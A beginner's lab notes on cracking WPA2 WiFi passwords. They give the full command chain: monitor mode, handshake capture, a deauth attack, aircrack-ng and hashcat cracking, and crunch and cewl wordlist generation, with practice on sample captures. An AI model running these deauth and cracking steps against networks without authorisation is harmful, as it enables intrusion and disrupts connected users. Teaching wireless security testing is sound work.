WiFi Penetration Testing Lab — Beginner Notes
Overview
WiFi password cracking (WPA2-PSK) works by:

Capturing the 4-way handshake when a device connects to a network
Trying passwords from a wordlist offline until one matches
This is not a cryptographic bypass — it exploits weak password choices.

The 4-Way Handshake
When a device connects to WPA2 WiFi:

Router → Client: Anonce (random number)
Client → Router: Snonce (client's random number) + MIC (Message Integrity Code)
Router → Client: GTK (Group Temporal Key) + MIC
Client → Router: Acknowledgement
All four messages are captured and stored in a .cap file. The MIC in message 2 is what we attack — we try passwords and check if they produce a matching MIC.

Tools


Tool	Purpose
iwconfig	Check wireless interfaces
airmon-ng	Enable/disable monitor mode
airodump-ng	Scan networks, capture packets
aireplay-ng	Deauth attacks (force handshake capture)
aircrack-ng	Crack handshake with wordlist
hcxpcapngtool	Convert .cap to hashcat format
hashcat	GPU-accelerated cracking
crunch	Generate custom wordlists
cewl	Scrape words from websites
Full Attack Chain
Step 1 — Check interface
bash



iwconfig
Step 2 — Enable monitor mode
bash



sudo airmon-ng check kill
sudo airmon-ng start wlan0
# Interface becomes wlan0mon
Step 3 — Scan networks
bash



sudo airodump-ng wlan0mon
Note: BSSID (MAC), CH (channel), ESSID (network name).

Step 4 — Capture on target
bash



sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c CH -w handshake wlan0mon
Step 5 — Deauth attack (new terminal)
bash



sudo aireplay-ng --deauth 4 -a AA:BB:CC:DD:EE:FF wlan0mon
Step 6 — Confirm handshake
Look for: WPA handshake: AA:BB:CC:DD:EE:FF

Step 7 — Crack
bash



sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap
The "No Wireless Extension" Problem
Running Kali in a VM means the virtual NIC has no radio hardware. The VM can't do monitor mode.

Solutions


Option	Details
USB WiFi adapter	TP-Link TL-WN722N, Alfa AWUS036ACH, Panda PAU05 — pass to VM via USB
Dual boot Kali	Boot directly on laptop hardware
Offline practice	Download sample handshakes and practice cracking
Passing USB to VM
VirtualBox: Devices → USB → Select adapter
VMware: VM → Removable Devices → Connect
Practice Without Hardware
Download sample handshake
bash



wget -O handshake.cap "https://raw.githubusercontent.com/warecrer/Bettercap-caplets/master/wpa_handshake.cap"
Verify
bash



sudo aircrack-ng handshake.cap
Expected:




     #  BSSID              ESSID           Encryption
     1  AA:BB:CC:DD:EE:FF  TestAP          WPA (1 handshake)
Error meaning "not a handshake capture":




Packets contained no EAPOL data; unable to process this AP.
Unzip rockyou (one time)
bash



sudo gunzip /usr/share/wordlists/rockyou.txt.gz
Crack
bash



sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake.cap
Wordlists
rockyou.txt (default)
bash



# Location
/usr/share/wordlists/rockyou.txt

# If compressed
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Count
wc -l /usr/share/wordlists/rockyou.txt
# ~14 million passwords
SecLists
bash



sudo apt install seclists -y
ls /usr/share/seclists/Passwords/
Custom wordlists with crunch
bash



# All 8-digit numbers
crunch 8 8 0123456789 -o numeric.txt

# Word + 2 digits
crunch 6 8 -t @@123 -o custom.txt

# Word + year
crunch 8 15 -t @@@@@2024 -o year_pass.txt
Scrape with cewl
bash



cewl https://example.com -w words.txt
Using Hashcat (GPU Cracking)
bash



# Convert .cap to hashcat format
sudo apt install hcxtools -y
hcxpcapngtool -o hash.hc22000 handshake.cap

# Crack
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Show result
hashcat -m 22000 hash.hc22000 --show
Hashcat is significantly faster than aircrack-ng due to GPU acceleration.

Troubleshooting


Issue	Cause	Fix
no wireless extension	VM has no physical WiFi card	Use USB adapter or dual boot
no EAPOL data	File is not a handshake capture	Get a proper .cap with handshake
internet dies after airmon-ng check kill	NetworkManager stopped	sudo service NetworkManager restart
rockyou.txt.gz not found	Not installed	sudo apt install wordlist or download
can't exit monitor mode	Interface stuck	sudo airmon-ng stop wlan0mon + restart NM
adapter not in monitor mode	Chipset not supported	Check chipset compatibility
Key Concepts


Term	Definition
Monitor mode	WiFi card listens to all packets, not just its own
4-way handshake	4 EAPOL messages exchanged during authentication
EAPOL	Extensible Authentication Protocol Over LAN — carries the handshake
Deauth attack	Spoofed disconnect frame forces client to reconnect
BSSID	MAC address of the access point
ESSID	Network name (SSID)
Wordlist	Text file with one password per line
Offline cracking	Trying passwords against the handshake without network interaction
PMK	Pairwise Master Key — derived from password + SSID
PTK	Pairwise Transient Key — derived from PMK + nonces + MACs
MIC	Message Integrity Code — what we compare to verify a password guess
Next Steps
Acquire a USB WiFi adapter that supports monitor mode
Pass it through to the VM
Run the full capture flow on your own network
Practice with different wordlists and cracking tools
Experiment with hashcat for GPU-accelerated cracking
References
Aircrack-ng Documentation
Hashcat Wiki
vanhoefm/wifi-example-captures — sample handshakes for practice
SecLists — wordlist collection
